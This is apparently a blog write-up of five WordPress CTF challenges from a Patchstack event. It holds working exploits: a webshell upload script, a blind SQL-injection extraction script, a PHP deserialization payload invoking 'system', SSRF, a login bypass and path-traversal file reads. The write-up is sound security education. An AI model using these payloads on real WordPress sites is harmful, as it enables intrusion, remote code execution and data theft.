---
layout: post
title: "Patchstack S02E03 WCEU 2025 - Writeup"
date: 2025-06-08 09:00:00
description: "Patchstack S02E03 WCEU 2025 - Writeup"
tag:
  - Web
  - WordPress
---

![Banner](/assets/img/Patchstack-S02E03-WCEU-2025/patchstack_s02e03_wceu.png)

<h2>Table of Contents</h2>
- TOC	- TOC
{:toc}

> To make it easier to Jump to Section, you can search for the name of the challenge.

# **Scoreboard Freeze**

![Scoreboard Freeze](/assets/img/Patchstack-S02E03-WCEU-2025/Scoreboard.png)

# **Custom Import**

**Description:**\
I try to use this old plugin to import stuff to my e-commerce website. I like it, so far.
This is a whitebox challenge, no need to bruteforce anything (login, endpoint, etc).\
http://18.140.17.89:9130

**Source Code Analysis: Arbitrary File Upload**\
Since this is a CTF and given the source code, the first step I did was to check where the flag was stored. It is known that in the Dockerfile, the flag is stored in /flag-REDACTED.txt.

File Dockerfile:

```sh
FROM wordpress:latest

COPY --chown=www-data:www-data challenge-custom/woo-import-export-lite/ /usr/src/wordpress/wp-content/plugins/woo-import-export-lite/
COPY --chown=www-data:www-data challenge-custom/test-plugin/ /usr/src/wordpress/wp-content/plugins/test-plugin/
COPY challenge-custom/flag.txt /flag-REDACTED.txt
RUN chmod 0444 /flag-REDACTED.txt
```

Since the flag name is random, it means that I probably need to get an RCE to read the flag.

Then in the Makefile file in the wordpress toolbox it is known that we have Write permission in the uploads folder, this is useful later if I have to upload webshell.

File Makefile:

```sh
...SNIP...
	$(WP_CLI) plugin delete akismet
	$(WP_CLI) plugin delete hello-dolly
	$(WP_CLI) plugin install woocommerce --activate
	$(WP_CLI) plugin activate woo-import-export-lite
	$(WP_CLI) plugin activate test-plugin

	@chmod -R 555 /var/www/html/
	@chmod -R 755 /var/www/html/wp-content/uploads
	@curl "http://${CHALL_SERVER_IP}:${CHALL_SERVER_PORT}" > /dev/null
	@sleep 1
	@chmod 111 /var/www/html/wp-config.php
```

Check the test-plugin folder contains only test-plugin.php files and with this I can register new users Unauthenticated through AJAX requests, which can be seen in the code under the action hook wp_ajax_nopriv_register_user.

File test-plugin.php:

```php
add_action("wp_ajax_nopriv_register_user", "register_user");

function register_user(){
    $userdata = array(
        'user_login' => sanitize_text_field($_POST["username"]),
        'user_pass' => sanitize_text_field($_POST["password"]),
        'user_email' => sanitize_text_field($_POST["email"]),
        'role' => 'subscriber',
    );

    wp_insert_user($userdata);
    echo "user created";
}
```

Okay, note that I can register users with subscriber roles, this is useful if other exploits must be authenticated.
Then I did a folder analysis of the woo-import-export-lite plugin. Here I focus on finding the upload file vulnerability first with the 'wp_handle_upload' grep. As a result, there is an upload file that uses this function and with a false "option test_type => false" which is not secure because it can lead to Arbitrary File Upload, namely in the "includes/classes/class-wpie-product.php" file.

References:
[Arbitrary File Upload](https://patchstack.com/academy/wordpress/vulnerabilities/arbitrary-file-upload/#test_type--false)
![Grep wp_handle_upload](/assets/img/Patchstack-S02E03-WCEU-2025/CustomImport-grep.png)

I immediately checked the function that uses the wp_handle_upload in the class-wpie-product.php file. It is known that the function is named "wpie_upload_csv_file".

File class-wpie-product.php:

```php
add_action('wp_ajax_wpie_upload_csv_file', array(&$this, 'wpie_upload_csv_file'));
…SNIP…
function wpie_upload_csv_file() {

        $file = $_FILES['async-upload'];

        $uploaded_file = wp_handle_upload($file, array('test_form' => true, 'action' => 'wpie_upload_csv_file', 'test_type' => false, 'ext' => "csv", 'type' => 'text/csv'));

        $current_time = time();

        if ($uploaded_file && !isset($uploaded_file['error'])) {
            $return_value['file_status'] = "success";

            if (isset($_POST['chunks']) && isset($_POST['chunk']) && preg_match('/^[0-9]+$/', $_POST['chunk'])) {
                $final_file = basename($_POST['name']);

                rename($uploaded_file['file'], WPIE_UPLOAD_DIR . '/' . $final_file . '.' . $_POST['chunk'] . '.csv.tmp');
                $uploaded_file['file'] = WPIE_UPLOAD_DIR . '/' . $final_file . '.' . $_POST['chunk'] . '.csv.tmp';

                // Final chunk? If so, then stich it all back together
                if ($_POST['chunk'] == $_POST['chunks'] - 1) {
                    if ($wh = fopen(WPIE_UPLOAD_DIR . '/' . $current_time . "_" . $final_file, 'wb')) {
                        for ($i = 0; $i < $_POST['chunks']; $i++) {
                            $rf = WPIE_UPLOAD_DIR . '/' . $final_file . '.' . $i . '.csv.tmp';
                            if ($rh = fopen($rf, 'rb')) {
                                while ($line = fread($rh, 32768))
                                    fwrite($wh, $line);
                                fclose($rh);
                                @unlink($rf);
                            }
                        }
                        fclose($wh);
                        $uploaded_file['file'] = WPIE_UPLOAD_DIR . '/' . $current_time . "_" . $final_file;
                    }
                }
            }
        } else {
            $return_value['file_status'] = "fail";
        }

        $return_value = array();

        $return_value['message'] = 'success';

        $return_value['file_url'] = $uploaded_file['file'];

        echo json_encode($return_value);

        die();
    }
```

From the code above, Arbitrary File Upload can be done by simply filling in the "async-upload" parameter with the malicious file and there is no need to enter the second IF Condition which requires the "chunk" parameter.
Also, since the "wp_handle_upload" process doesn't have a storage location defined, by default the upload file will be stored in "/wp-content/uploads/[year]/[month]/filename.extensions.
Okay, from the analysis of the source code above, it can be concluded that the flow of exploitation is as follows.

1. Register user using the action hook wp_ajax_nopriv_register_user
2. Log in with the user that has been created
3. Upload a PHP file containing a webshell using the action hook wp_ajax_wpie_upload_csv_file
4. Access the webshell file at /wp-content/uploads/2025/06/filename.extensions
5. Read flag di filesystem

**Exploit:**\
File solver.py:

```python
import requests
import os
import sys
import re

import requests
import io
from urllib.parse import *

URL = 'http://18.140.17.89:9130/'

class Exploit:
    def __init__(self, username, email, password, url=URL):
        self.url = url
        self.session = requests.session()
        self.username = username
        self.email = email
        self.password = password

    def register(self):
        print('[+] Register User')
        data = {'action':'register_user', 'username': self.username, 'email': self.email, 'password': self.password}
        req = requests.post(urljoin(self.url, '/wp-admin/admin-ajax.php'), data=data)

        return req.text

    def login(self):
        print('[+] Login to Wordpress')
        headers = {'Cookie':'wordpress_test_cookie=WP Cookie check'}
        data = {'log': self.username, 'pwd': self.password, 'wp-submit':'Log In', 'redirect_to':urljoin(self.url, '/wp-admin/'), 'testcookie':'1'}
        req = self.session.post(urljoin(self.url, '/wp-login.php'), headers=headers, data=data)

        return '[+] Login Successful' if req.status_code == 200 else '[+] Login Failed'

    def uploadFile(self):
        print('[+] Try Uploading File')
        phpContent = b'<?php system($_GET["b4nu4"]); ?>'
        files = {'async-upload': ('b4nu4_shell.php', io.BytesIO(phpContent))}
        data = {'action': 'wpie_upload_csv_file'}
        req = self.session.post(urljoin(self.url, '/wp-admin/admin-ajax.php'), data=data, files=files)

        return req.text

if __name__ == '__main__':
    run = Exploit('b4nu4','b4nu4@test.local', 'banua@123_')
    print(run.register())
    print(run.login())
    print(run.uploadFile())
```

Run the solver:
![Solver](/assets/img/Patchstack-S02E03-WCEU-2025/CustomImport-solver.png)

Read flag in /flag\*:
![Flag](/assets/img/Patchstack-S02E03-WCEU-2025/CustomImport-readflag.png)

**FLAG:** CTF{type_misconfig_it_is_yeah_you_know_it_154154_1337333333}

# **What is magic**

**Description:**\
¯*(ツ)*/¯ it happens. This is a whitebox challenge, no need to brute-force anything (login, endpoint, etc).\
http://18.140.17.89:9170

**Source Code Analysis: SQL Injection**\
Just like before, I checked the location of the flag first. It is known that in the Makefile wordpress toolbox file, the flag is stored in the database in the wp_options table, usually this wordpress table contains option_value columns to store option_name named "lmi".

File Makefile:

```sh
...SNIP...
	$(WP_CLI) option update siteurl "http://${CHALL_SERVER_IP}:${CHALL_SERVER_PORT}"
	$(WP_CLI) rewrite structure $(WORDPRESS_WEBSITE_POST_URL_STRUCTURE)
	$(WP_CLI) option add whatismagic "filter_input"
	$(WP_CLI) option add lmi "CTF{REDACTED}"
	$(WP_CLI) option add lvalue "REDACTEDSOMEVALUE"
	$(WP_CLI) db query "CREATE TABLE products (id INT AUTO_INCREMENT PRIMARY KEY);"
	$(WP_CLI) db query "INSERT INTO products (id) VALUES (1);"
	$(WP_CLI) db query "CREATE TABLE pass (value VARCHAR(255),active TINYINT(1));"
	$(WP_CLI) db query "INSERT INTO pass (value, active) VALUES ('REDACTEDSOMEVALUE', 1);"
```

Since the flag is stored in the database or wp options, the first possible vulnerability that comes to mind is SQL Injection.
Analyzing wim.php files, it is known that there are "$wpdb->get_results" that are vulnerable to SQLinjection. This function will process the location and fallback parameters that can be controlled by the user.

File wim.php:

```php
<?php
/*
 *
*/

include 'wp-load.php';
global $wpdb;


$bptm = get_option('whatismagic');
$lvalue = get_option ('lvalue');
$lmi = get_option('lmi');


if (isset($_GET['func'])) {

    $func = $_GET['func'];
    $input = $_GET['input'];
    $fnl = $_GET['fnl'];

    if ($func === $bptm && function_exists($func)) {

        $locate = $func($input, 'locate');
        $fallback = $func($input, 'fallback');

    }
}else {

$locate = $_GET['locate'];
$fallback = $_GET['fallback'];
$fnl = $_GET['fnl'];

}

if ($locate) {

    if ($fallback) {

        $join = "'" . implode("', '", [$locate, $fallback]) . "'";

    } else {

        $join = "'" . $locate . "'";
    }

    $sql = "
        SELECT p.id, l.value
        FROM products p
        JOIN pass l ON l.value IN ({$join}) AND l.active = 1
    ";

    $results = $wpdb->get_results($sql, ARRAY_A);

    echo "Results: <pre>" . json_encode($results, JSON_PRETTY_PRINT) . "</pre>";

    foreach ($results as $row) {

        echo "<pre>" . htmlspecialchars(print_r($row, true)) . "</pre>";

    }

    if ($results && $fnl === $lvalue){

        echo "<pre> testing..." . $lmi ."</pre>";
    }

} else {

    echo "Provide locate parameter.";
}
?>
```

For variable $bptm, $lvalue, $lmi I can find out the value through the Makefile file mentioned above.
Here are the real values.

```php
$bptm = ‘filter_input’;
$lvalue = ‘REDACTEDSOMEVALUE’;
$lmi = ‘CTF{REDACTED}’
```

I focus on the first IF Condition where the request contains the "func" parameter to perform SQL Injection. More or less the explanation of the code goes like this.

```php
if (isset($_GET['func'])) {

    $func = $_GET['func'];              // parameter 'func' contains 'filter_input'
    $input = $_GET['input'];            // paramter 'input' contains number '1'
    $fnl = $_GET['fnl'];                    // parameter ‘fnl’ is not used

    // If 'filter_input' === 'filter_input' and function 'filter_input' it exists {}
    if ($func === $bptm && function_exists($func)) {

       $locate = $func($input, 'locate');       // filter_input(INPUT_GET, ‘locate’)
       $fallback = $func($input, 'fallback');  // filter_input(INPUT_GET, ‘fallback’)
```

Okay, try to detect whether SQL Injection is valid or not by entering a Boolean based payload.
![Validate SQLi](/assets/img/Patchstack-S02E03-WCEU-2025/WhatIsMagic-validatesqli.png)

It can be seen from the evidence above that the results are valid, meaning that I can dump the flag using boolean based with the data:
• Database: wordpress
• Table: wp_options
• Column: option_value
• Where: option_name=’lmi’

**Exploit:**\
File solver.py:

```python
import requests
import time
from string import ascii_lowercase, ascii_uppercase, digits
from urllib.parse import *

URL = 'http://18.140.17.89:9170/wim.php'

class Exploit:
	def __init__(self, url=URL):
		self.url = url

	def boolean(self):
		flag = ""
		position = 1
		while "}" not in flag:
			for char in range(32, 127):

				# Dump Flag
				payload = f"1') OR ORD(SUBSTRING((SELECT option_value FROM wordpress.wp_options WHERE option_name='lmi'),{position},1)) = {char}-- -"
				params = {'func': 'filter_input', 'input': 1, 'locate': payload, 'fallback': ''}

				req = requests.get(URL, params=params)

				if 'id' in req.text:
					flag += chr(char)
					position += 1
					print(f'[+] Found Flag: {flag}')
				else:
					pass
		return f'[+] Found Flag: {flag}'

if __name__ == '__main__':
	run = Exploit()
	print(run.boolean())
```

Run the exploit and the flag is obtained.
![Flag](/assets/img/Patchstack-S02E03-WCEU-2025/WhatIsMagic-flag.png)

**FLAG:** CTF{763eddf891f891_whatismagic_354df89133ed45df891df891}

# **Orangy**

**Description:**\
URGENT: We've intercepted a WordPress development environment from the notorious ransomware group "Orangy". Their decryption key is hidden somewhere in the server, and we need it to help hundreds of affected customers recover their files. Time is critical - can you help us retrieve the key before more systems are compromised?
This is a gray-box challenge, no need to bruteforce anything (login, endpoint, etc).\
http://18.140.17.89:9160

**Source Code Analysis: Server-Side Request Forgery & Apache Missconfig**\
No source code is given, but notes from the developer which contain the following.
File dev_notes.md:

```md
# Classic Editor Enhancement

## Developer Notes - 2025-05-27

Hey affiliates! Quick update on the Classic Editor plugin enhancement project. I've been working on integrating the jFeed library to improve our RSS feed handling capabilities. Here's what's been happening:

### Current Status

- Attempting to modernize the Classic Editor plugin with better RSS feed support. Classic Editor is installed on the WordPress site.
- Created a backup of the modified plugin with jFeed in `/tmp/backup/classic-editor/scripts/jFeed/` while testing the jFeed integration
- RewriteRules are enabled in the Apache configuration, not working as intended yet but redirecting '/html/\*' to '/$1.html'

### Known Issues

1. The jFeed proxy script is causing some unexpected behavior
2. Need more testing before moving changes from backup to production
3. Apache needs an update to handle some new URL rewriting rules we're implementing

### Decryption Key

I've left the decryption key at `/opt/flag.txt`. I know some Patchstack hunters are looking into this, so only internal access is allowed.

### TODO

- [ ] Complete jFeed integration testing
- [ ] Move working code from `/tmp/backup/` to production
- [ ] Update Apache configuration
- [ ] Clean up temporary files
- [ ] Implement proper security measures for proxy scripts

### Environment Details

- WordPress with Classic Editor plugin
  > ⚠ Note: This is a development environment. Some security measures may be temporarily disabled for testing purposes.
```

Here are the key points:
• The flag is located in /opt/flag and only internal access is allowed
• Apache Config RewriteRules redirecting '/html/\*' to '/$1.html'
• jFeed integration, the jFeed proxy script is causing some unexpected behavior
• Classic Editor

From these keypoints, it can be concluded that there is an SSRF vulnerability to read local files, namely the flag located in /opt/flag using jFeed Proxy.

There are RewriteRules that are vulnerable and can be bypassed such "/index.php?validparam=abc&tes=abc.html"

I tried browsing jFeed Proxy on github and got a repository https://github.com/jfhovinne/jFeed/blob/master/proxy.php it contains:

File proxy.php:

```php
<?php
header('Content-type: application/xml');
$handle = fopen($_REQUEST['url'], "r");

if ($handle) {
    while (!feof($handle)) {
        $buffer = fgets($handle, 4096);
        echo $buffer;
    }
    fclose($handle);
}
?>
```

Yes, the proxy.php are vulnerable to SSRF.

In addition, when browsing with the keyword “writeup ctf bypass apache rules RewriteRule ^html/(.\*)$ /$1.html”, A related PoC article was obtained to solve this problem.

![Keyword](/assets/img/Patchstack-S02E03-WCEU-2025/Orangy-keyword.png)

When opened, there is a PoC that is full of the same as this question.
![POC](/assets/img/Patchstack-S02E03-WCEU-2025/Orangy-poc.png)

Just do it right away on this challenge.

**Exploit:**\
![Exploit](/assets/img/Patchstack-S02E03-WCEU-2025/Orangy-exploit.png)

**FLAG:** CTF{g0t_some_0rang31337_d3339yy8d2}

# **Everest Expedition**

**Description:**\
I made a plugin for the local travel agency that takes their clients on Everest expeditions. They want a cool and secure plugin. Is this alright?
This is a whitebox challenge, no need to brute-force anything (login, endpoint, etc).\
http://18.140.17.89:9140

**Source Code Analysis: PHP Object Injection (Deserialization)**\
In the Dockerfile, it is known that the flag is in /flag.txt. It is not yet known if it can be read locally or should be RCE.

File Dockerfile:

```sh
FROM wordpress:latest

COPY --chown=www-data:www-data challenge-custom/everest-expedition/ /usr/src/wordpress/wp-content/plugins/everest-expedition/
COPY flag.txt /flag.txt
RUN chmod 0444 /flag.txt
```

I did an analysis of the source code provided. It is known that in class-expedition-data.php file there is the use of the maybe_unserialize function and the magic method \_\_destruct(). From this code, it can be confirmed that deserialization/PHP Object Injection is the vuln.

File class-expedition-data.php:

```php
<?php
class Everest_Expedition_Data {
    private $data;
    private $serializer;
    private $validator;

…SNIP…

    public function __destruct() {
        $init = $this->serializer->validateRoute();
    }

    public function createExpeditionPost() {
        $expedition_details = $this->getExpeditionDetails();

        $post_data = array(
            'post_title'   => $expedition_details['name'],
            'post_status'  => 'publish',
            'post_type'    => 'everest_expedition',
            'post_content' => sprintf(
                'Expedition from %s to %s. Team size: %d. Route: %s. Remarks: %s',
                $expedition_details['start_date'],
                $expedition_details['end_date'],
                $expedition_details['team_size'],
                $expedition_details['route'],
                maybe_unserialize($expedition_details['remarks'])
            )
        );

        $post_id = wp_insert_post($post_data);

        if (is_wp_error($post_id)) {
            return $post_id;
        }

        // wp_delete_post($post_data); //TODO: Remove this code and store the submissions

        return $post_id;
    }
…SNIP…
```

Then, the createExpeditionPost() function containing the maybe_unserialize() is used in the class-api-handler.php file, namely the handle_expedition_submission() function.

Then, the handle_expedition_submission() function is consumed in the "everest/v1/expedition" REST API.

File class-api-handler.php:

```php
…SNIP…
       register_rest_route('everest/v1', '/expedition', array(
            'methods' => 'POST',
            'callback' => array($this, 'handle_expedition_submission'),
            'permission_callback' => function() {
                return true;
            },
            'args' => array(
                'name' => array(
                    'required' => true,
                    'type' => 'string'
                ),
                'start_date' => array(
                    'required' => true,
                    'type' => 'string'
                ),
                'end_date' => array(
                    'required' => true,
                    'type' => 'string'
                ),
                'team_size' => array(
                    'required' => true,
                    'type' => 'integer'
                ),
                'route' => array(
                    'required' => false,
                    'type' => 'string',
                    'default' => 'south_col'
                ),
                'remarks' => array(
                    'required' => false,
                    'type' => 'string',
                    'default' => 'Climb! Climb!! Climb!!!'
                )
            )
        ));

…SNIP…

    public function handle_expedition_submission($request) {
        $params = $request->get_params();

        $expedition = new Everest_Expedition_Data($params);

        $post_id = $expedition->createExpeditionPost();

        if (is_wp_error($post_id)) {
            return new WP_Error(
                'expedition_creation_failed',
                'Failed to create expedition',
                array('status' => 500)
            );
        }

        // Store expedition details as post meta
        $expedition_details = $expedition->getExpeditionDetails();
        foreach ($expedition_details as $key => $value) {
            update_post_meta($post_id, '_expedition_' . $key, $value);
        }

        return rest_ensure_response(array(
            'success' => true,
            'expedition_id' => $post_id
        ));
    }
```

From the results of the analysis above, it can be concluded that I should do PHP Object Injection with flow:

1. Generate PHP Object Injection payload with an inject object $serializer contains an object from Everest_Climbing_Route() i.e. sherpa contains 'system' and route data contains 'cat /flag.txt'
2. Made a request to the REST API "/wp-json/everest/v1/expedition"
3. Request berisi data “name=test&start_date=2023-01-01&end_date=2023-01-02&team_size=1&route=test&remarks=[PAYLOAD]”
4. PHP Object Injection payload in inject on remarks parameters
5. RCE obtained

**Exploit:**\
File generate-serialized-shell.php:

```php
<?php
class Everest_Expedition_Data {}
class Everest_Climbing_Route {}

$climbing_route = new Everest_Climbing_Route();
$climbing_route->sherpa = 'system';
$climbing_route->route_data = 'cat /flag.txt';

// Siapkan objek utama
$expedition_data = new Everest_Expedition_Data();
$expedition_data->serializer = $climbing_route;

echo serialize($expedition_data);
?>
```

Run the serialized shell generator and retrieve the serialized data.
![Generator](/assets/img/Patchstack-S02E03-WCEU-2025/EverestExpedition-generator.png)

Make a request to the REST API containing the payload and the flag is obtained.
![Flag](/assets/img/Patchstack-S02E03-WCEU-2025/EverestExpedition-flag.png)

**FLAG:** CTF{f1nd1ng_flag_in_the_mt_everest_8848}

# **Ghost Post**

**Description:**\
Building an app is hard, but we can just base it on WordPress. Nothing can go wrong there, right?
This is a whitebox challenge, no need to brute-force anything (login, endpoint, etc).\
http://18.140.17.89:9180

**Source Code Analysis: Improper Login Validation**\
Check the location of the flag first and find the flag in the post. However, it seems that there are custom settings for the post type. It can be seen on the Makefile file in the wordpress toolbox.

File Makefile:

```sh
	$(WP_CLI) option update siteurl "http://${CHALL_SERVER_IP}:${CHALL_SERVER_PORT}"
	$(WP_CLI) rewrite structure $(WORDPRESS_WEBSITE_POST_URL_STRUCTURE)
	$(WP_CLI) plugin delete akismet
	$(WP_CLI) plugin delete hello-dolly
	$(WP_CLI) plugin activate ghost-post

	$(WP_CLI) user create ghosty ghosty@ctf.example --role=author --porcelain

	$(WP_CLI) post create --post_title="Ghost View" --post_status=publish --post_type=page --post_content='[ghost_list]' --post_author=2 --porcelain
	$(WP_CLI) post create --post_title="Ghost Stats" --post_status=publish --post_type=page --post_content='[ghost_sync_stats]' --post_author=2 --porcelain
	$(WP_CLI) post create --post_title='Found me!' --post_status=publish --post_type='ghost_entry' --post_content="Found it! ${FLAG_FLAG}" --post_author=2 --porcelain
```

Analysis of ghost-post file plugins ghostly-integration-plugin.php found that there is a shortcode [ghost_list] that renders a post with type ghost_entry containing a flag.

File ghostly-integration-plugin.php:

```php
…SNIP…
add_shortcode('ghost_list', function () {
    $ghost_logged_in = ghostly_get_secure_cookie('ghostly_logged_in');
    if (!$ghost_logged_in) {
        return '<em>No ghosts synced.</em>';
    }

    $q = new WP_Query([
        'post_type' => 'ghost_entry',
        'post_status' => 'publish',
    ]);

    if (empty($q->posts)) return '<em>No ghost entries found.</em>';

    $output = '<div class="ghost-list">';
    foreach ($q->posts as $p) {
        $output .= '<div class="ghost-entry"><strong>' . esc_html($p->post_title) . '</strong><br>';
        $output .= '<div>' . esc_html($p->post_content) . '</div></div>';
    }
    $output .= '</div>';
    return $output;
});
…SNIP…
```

In the shortcode, there is a condition where it must go through the process of ghostly_get_secure_cookie('ghostly_logged_in'). The analysis function is known to only validate the signature of the cookie.

```php
…SNIP…
function ghostly_get_secure_cookie($name) {
    if (empty($_COOKIE[$name])) {
        return false;
    }
    $decoded = json_decode(base64_decode($_COOKIE[$name]), true);
    if (!isset($decoded['value'], $decoded['sig'])) {
        return false;
    }
    $secret_key = wp_salt('auth');
    $expected_sig = hash_hmac('sha256', $decoded['value'], $secret_key);
    if (!hash_equals($expected_sig, $decoded['sig'])) {
        return false;
    }
    return $decoded['value'];
}
…SNIP…
```

Then, how do you get the cookies? In the ghostly-integration-plugin.php file, there is also a function ghostly_set_secure_cookie() to generate cookies.

```php
…SNIP…
function ghostly_set_secure_cookie($name, $value, $expire = 3600) {
    $secret_key = wp_salt('auth');
    $signature = hash_hmac('sha256', $value, $secret_key);
    $data = base64_encode(json_encode([
        'value' => $value,
        'sig'   => $signature,
    ]));

    setcookie($name, $data, time() + $expire, COOKIEPATH, COOKIE_DOMAIN, is_ssl(), true);
}
…SNIP…
```

And the function is executed on the login handler with the function name ghostly_login_handler() and can be accessed via the REST API "/wp-json/ghostly/v1/login".

```php
…SNIP…
add_action('rest_api_init', function () {
    register_rest_route('ghostly/v1', '/login', [
        'methods'             => 'POST',
        'callback'            => 'ghostly_login_handler',
        'permission_callback' => '__return_true',
    ]);
});

function ghostly_login_handler(WP_REST_Request $request) {

    $username = $request->get_param('user');
    $password = $request->get_param('pass');

    $existing_user = username_exists($username);

    if (empty($username) || empty($password) || !$existing_user) {
        return new WP_REST_Response(['error' => 'Invalid credentials'], 403);
    }

    if (user_can($existing_user, 'manage_options')) {
        return new WP_REST_Response(['error' => 'Keep your site secure! Don\'t use administrator accounts!'], 403);
    }

    $user = wp_authenticate_application_password(null, $username, $password);
    if (is_wp_error($user)) {
        return new WP_REST_Response(['error' => 'Invalid credentials'], 403);
    }

    ghostly_set_secure_cookie("ghostly_id", $user->ID);
    ghostly_set_secure_cookie("ghostly_logged_in", true);

    return new WP_REST_Response(['success' => 'Ghost session established'], 200);
}
…SNIP..
```

The login handler's function is vulnerable due to improper validation where it does not validate the password. The validation carried out only checks whether the username and password are not blank and the username is registered, but the username cannot be admin.
The login can be bypassed by filling in a valid username other than the admin, and a random password because it is not validated.
Then, after successfully logging in, what should I do because I can't create a post? Going back to the Makefile file in the wordpress tool for the first explanation, it is known that there is one post that contains content with a shortcode [ghost_list].
This means that I can access the /ghost-view page endpoint directly to get the flag after getting the cookie session.
From the analysis of the source code above, it can be concluded that the flow of the exploit is:

1. Get valid users other than admins, you can do it with access to "/wp-json/wp/v2/users"
2. Login with a valid user other than admin with a hit request to the endpoint "/wp-json/ghostly/v1/login" containing the data "user=[VALID USER OTHER THAN ADMIN]&pass=random"
3. Access the "http://18.140.17.89:9180/ghost-view/" page
4. Flag obtained

**Exploit:**\
Getting a valid username other than Administrator, you get a "ghosty" user.
![Valid User](/assets/img/Patchstack-S02E03-WCEU-2025/GhostPost-validuser.png)

Sign in with the user and grab the cookie.
![Sign In](/assets/img/Patchstack-S02E03-WCEU-2025/GhostPost-signin.png)

Access the "http://18.140.17.89:9180/ghost-view/" page with the session cookie obtained, then the flag is obtained.
![Flag](/assets/img/Patchstack-S02E03-WCEU-2025/GhostPost-flag.png)

**FLAG:** CTF{wOah_sp00ky_p0sts}

# **Open Contributions**

**Description:**\
I installed a plugin enabling everybody to post their articles on my blog, that way I won't need to spend time on it, I'm a genius, right?
This is a whitebox challenge, no need to bruteforce anything (login, endpoint, etc).\
http://18.140.17.89:9150

**Source Code Analysis: Arbitrary File Read**\
In the Dockerfile file, it is known that the flag is in /flag.txt.

File Dockerfile:

```sh
FROM wordpress

COPY --chown=www-data:www-data challenge-custom/wp-login.php /usr/src/wordpress
COPY --chown=www-data:www-data challenge-custom/open-contributions/ /usr/src/wordpress/wp-content/plugins/open-contributions/
COPY challenge-custom/flag.txt /flag.txt
RUN chmod 0444 /flag.txt
```

Continuing the analysis of the open-contribution plugin, it is known that in class-shortcodes.php file there is an Arbitrary File Read, which is the renderPreview function which is consumed by the shortcode [preview_file].

File class-shortcodes.php:

```php
add_shortcode('preview_file', [__CLASS__, 'renderPreview']);

…SNIP…
    public static function renderPreview($atts) {
        $atts = shortcode_atts(['path' => ''], $atts);
        $filepath = ABSPATH . sanitize_text_field($atts['path']);
        if (file_exists($filepath)) {
            return '<pre>' . esc_html(file_get_contents($filepath)) . '</pre>';
        }
        return '<strong>File ' . $filepath . ' not found or inaccessible.</strong>';
    }
…SNIP…
```

To create a post containing the shortcode, at least I have to have a user with the Contributor role.
In the class-ajax-handler.php file, there is a handleRolePromotion() function that promotes the user to a Contributor. As for executing AJAX, it must be Authenticated.

File class-ajax-handler.php:

```php
add_action('wp_ajax_promote_to_contributor', [__CLASS__, 'handleRolePromotion']);

…SNIP…
    public static function handleRolePromotion() {

        $user = wp_get_current_user();
        if ($user && in_array('subscriber', $user->roles)) {
            $user->set_role('contributor');
            wp_send_json_success('User elevated to contributor. You can now contribute with your own posts !');
        }

        wp_send_json_error('Role promotion failed.');
    }
```

Try to access wp-login.php, it turns out that the registry feature is opened.
![Register Page](/assets/img/Patchstack-S02E03-WCEU-2025/OpenContrib-registerpage.png)

This means that I can register a new user with a minimum role, namely a subscriber.

From the analysis of the source code above, it can be concluded that the flow of the exploit is:

1. Register new user
2. Login with new user
3. Promote users using AJAX handler with promote_to_contributor action
4. Create post contain shortcode [preview_file path=’.. /.. /.. /.. /flag.txt’]
5. Flag obtained

**Exploit:**\
Register the user first.
![Register Success](/assets/img/Patchstack-S02E03-WCEU-2025/OpenContrib-registersuccess.png)

Log in using a new user.
![Login](/assets/img/Patchstack-S02E03-WCEU-2025/OpenContrib-login.png)

Promote the role to Contributor.
![Promote Role](/assets/img/Patchstack-S02E03-WCEU-2025/OpenContrib-promote.png)

Create post dengan shortcode [preview_file path=’.. /.. /.. /.. /flag.txt’].
![Create Post](/assets/img/Patchstack-S02E03-WCEU-2025/OpenContrib-createpost.png)

Submit Post, then view page and flag obtained.
![Flag](/assets/img/Patchstack-S02E03-WCEU-2025/OpenContrib-flag.png)

**FLAG:** CTF{CONTRIBUTOR_TO_THE_BACKDOOR_0z933}

Thank you for reading this article, i hope it was helpful :-D\
**Follow me on: [Linkedin], [Medium], [Github], [Youtube], [Instagram]**

[Linkedin]: https://www.linkedin.com/in/muhammad-ichwan-banua/
[Medium]: https://banua.medium.com
[Github]: https://github.com/banuaa
[Youtube]: https://www.youtube.com/@muhammad.iwn-banua
[Instagram]: https://www.instagram.com/muhammad.iwn
